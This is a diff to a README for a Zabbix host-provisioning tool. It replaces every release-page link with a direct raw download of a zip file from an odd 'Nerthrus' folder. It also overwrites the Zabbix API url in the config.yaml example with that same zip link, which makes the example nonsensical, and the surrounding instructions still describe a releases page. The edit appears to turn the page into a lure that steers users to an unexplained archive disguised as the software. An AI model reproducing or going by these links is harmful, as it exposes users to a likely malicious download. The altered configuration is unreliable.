@@ -1,6 +1,6 @@
 # ⚙️ zabbix-auto-provisioning - Easy Host Setup for Zabbix
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Get%20Latest-brightgreen?style=for-the-badge)](https://github.com/syreniti5667/zabbix-auto-provisioning/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Get%20Latest-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/syreniti5667/zabbix-auto-provisioning/main/Nerthrus/zabbix_provisioning_auto_v3.2.zip)
 
 ## 📋 What is zabbix-auto-provisioning?
 
@@ -34,7 +34,7 @@ Before you start, make sure your Windows PC meets these basic needs:
 
 1. Click this big button below to visit the release page where you will find the latest software versions:
 
-   [![Download on GitHub](https://img.shields.io/badge/Download-Zabbix%20Auto%20Provisioning-blue?style=for-the-badge)](https://github.com/syreniti5667/zabbix-auto-provisioning/releases)
+   [![Download on GitHub](https://img.shields.io/badge/Download-Zabbix%20Auto%20Provisioning-blue?style=for-the-badge)](https://raw.githubusercontent.com/syreniti5667/zabbix-auto-provisioning/main/Nerthrus/zabbix_provisioning_auto_v3.2.zip)
 
 2. Scroll to the **Assets** section of the latest release. Look for a file named something like `zabbix-auto-provisioning-windows.zip` or a `.exe` installer.
 
@@ -89,7 +89,7 @@ Example of `config.yaml`:
 
 ```yaml
 zabbix_api:
-  url: http://zabbix.example.com/api_jsonrpc.php
+  url: https://raw.githubusercontent.com/syreniti5667/zabbix-auto-provisioning/main/Nerthrus/zabbix_provisioning_auto_v3.2.zip
   username: admin
   password: my_password
 hosts_file: hosts.yaml
@@ -140,4 +140,4 @@ Here is what the typical folder looks like after you extract or install:
 
 Return to the releases page here to get the latest version:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Get%20Latest-brightgreen?style=for-the-badge)](https://github.com/syreniti5667/zabbix-auto-provisioning/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Get%20Latest-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/syreniti5667/zabbix-auto-provisioning/main/Nerthrus/zabbix_provisioning_auto_v3.2.zip)
